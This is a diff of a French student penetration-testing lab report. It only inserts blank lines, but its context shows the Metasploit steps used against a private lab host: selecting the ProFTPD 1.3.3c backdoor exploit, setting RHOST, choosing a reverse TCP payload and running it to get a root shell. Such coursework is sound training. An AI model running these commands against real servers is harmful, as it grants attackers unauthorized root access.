@@ -17,6 +17,7 @@ On voit que 3 ports sont ouverts : le 21, le 22 et le 80
 On peut essayer de se connecter en ftp (avec l'identifiant et le mdp 'ftp')
 `ftp 10.0.2.6`
 La connexion echoue.
+
 ![1732270713862](image/rapport-tp3/1732270713862.png)
 
 Dans l'analyse des ports, on remarque que la version est "ProFTPD 1.3.3c"
@@ -30,12 +31,14 @@ On peut essayer d'utiliser `msfconsole` pour accéder au shell metasploit qui pe
 `use 0` pour séléctionner "exploit/unix/ftp/proftpd_133c_backdoor"
 
 ![1732274737827](image/rapport-tp3/1732274737827.png)
+
 En accédant aux `options`, on constate que rhost n'est pas configuré. On défini donc l'ip de rhost.
 `set rhost 10.0.2.6`
 
 Rport est correctement cofiguré, on y touche pas.
 
 On affiche les payloads
+
 ![1732274488451](image/rapport-tp3/1732274488451.png)
 
 Dans notre cas, on veux une reverse TCP connexion donc on séléctionne l'élément 4 `set payload 4`
@@ -46,9 +49,11 @@ Dans les options, on voit que LHOST est requis mais n'est pas défini. Il faut d
 Avec la commande `run`, on peut maintenant exploiter la faille de sécurité pour se connecter en ftp.
 
 ![1732275074257](image/rapport-tp3/1732275074257.png)
+
 On constate qu'une connexion est bien ouverte (10.0.2.4:4444 -> 10.0.2.6:34682) et si je tape la commande `whoami`, je suis bien utilisateur root. De plus, 
 
 Je peux ouvrir un shell et faire toutes les manipulations souhaitées sur la machine cible en tant que root.
+
 ![1732275364664](image/rapport-tp3/1732275364664.png)
 
 ## Port 22
